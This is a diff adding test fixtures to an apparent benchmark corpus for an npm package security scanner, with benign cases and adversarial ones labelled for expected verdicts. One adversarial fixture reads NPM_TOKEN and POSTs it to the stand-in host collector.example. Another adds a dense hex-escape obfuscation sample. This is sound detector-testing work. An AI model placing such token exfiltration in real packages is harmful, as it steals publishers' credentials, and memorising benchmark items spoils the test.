@@ -266,6 +266,40 @@ export function buildBenchmarkCorpus(): CorpusCase[] {
         ]),
     },
     {
+      id: "benign-20-esbuild-scoped-env-alias",
+      category: "benign",
+      expected: ["VERIFIED_CLEAN_WITHIN_SCOPE"],
+      run: () =>
+        runInspectFixture("esbuild-color-cli", [
+          { name: "package/package.json", content: JSON.stringify({ name: "esbuild-color-cli", version: "1.0.0", license: "MIT" }) },
+          {
+            name: "package/index.mjs",
+            content:
+              'var __cjs = (cb, m) => () => (m || cb((m = { exports: {} }).exports, m), m.exports); var modA = __cjs({ "color.js"(e, m) { var env2 = process.env; const c = env2.FORCE_COLOR || env2.NO_COLOR || env2.NODE_DEBUG || env2.npm_package_name; var url2 = env2.CUSTOM_DEBUG; m.exports = { c, url2 }; } }); function pingUrl(url2) { const u = "https://registry.npmjs.org/" + url2; return fetch(u); } pingUrl("-/ping"); console.log(modA);',
+          },
+        ]),
+    },
+    {
+      id: "benign-21-unicode-regexp-parser",
+      category: "benign",
+      expected: ["VERIFIED_CLEAN_WITHIN_SCOPE"],
+      run: () => {
+        const ranges = Array.from({ length: 120 }, (_, i) => {
+          const a = (0x00c0 + i * 4).toString(16).padStart(4, "0");
+          const b = (0x00c0 + i * 4 + 2).toString(16).padStart(4, "0");
+          return `\\u${a}-\\u${b}`;
+        }).join("");
+        const code = [
+          `const UNI_RE = /[${ranges}]/u;`,
+          ...Array.from({ length: 24 }, (_, i) => `export function lex${i}(s) { return UNI_RE.test(s) ? s.trim() : s; }`),
+        ].join("\n");
+        return runInspectFixture("unicode-parser-cli", [
+          { name: "package/package.json", content: JSON.stringify({ name: "unicode-parser-cli", version: "1.0.0", license: "MIT" }) },
+          { name: "package/parser.js", content: code },
+        ]);
+      },
+    },
+    {
       id: "adv-01-postinstall-curl-pipe-sh",
       category: "adversarial",
       expected: ["MALICIOUS_INDICATORS_FOUND"],
@@ -590,6 +624,31 @@ export function buildBenchmarkCorpus(): CorpusCase[] {
           { name: "package/barrel.js", content: 'export { dispatch } from "./sink.js";' },
           { name: "package/index.js", content: 'import { dispatch } from "./barrel.js"; dispatch(process.env.NPM_TOKEN);' },
         ]),
+    },
+    {
+      id: "adv-27-closure-captured-taint",
+      category: "adversarial",
+      expected: ["MALICIOUS_INDICATORS_FOUND"],
+      run: () =>
+        runInspectFixture("closure-stealer", [
+          { name: "package/package.json", content: JSON.stringify({ name: "closure-stealer", version: "1.0.0", license: "MIT" }) },
+          {
+            name: "package/index.js",
+            content: 'const tok = process.env.NPM_TOKEN; function send() { fetch("https://collector.example/c", { method: "POST", body: tok }); } send();',
+          },
+        ]),
+    },
+    {
+      id: "adv-28-dense-hex-escape-obfuscation",
+      category: "adversarial",
+      expected: ["QUARANTINE_SUSPICIOUS", "MALICIOUS_INDICATORS_FOUND"],
+      run: () => {
+        const denseHex = Array.from({ length: 84 }, (_, i) => `\\x${(65 + (i % 26)).toString(16)}`).join("");
+        return runInspectFixture("hex-esc-obf", [
+          { name: "package/package.json", content: JSON.stringify({ name: "hex-esc-obf", version: "1.0.0", license: "MIT" }) },
+          { name: "package/index.js", content: `// ${"a".repeat(2000)}\nconst blob = "${denseHex}"; console.log(blob);` },
+        ]);
+      },
     },
   ];
 }
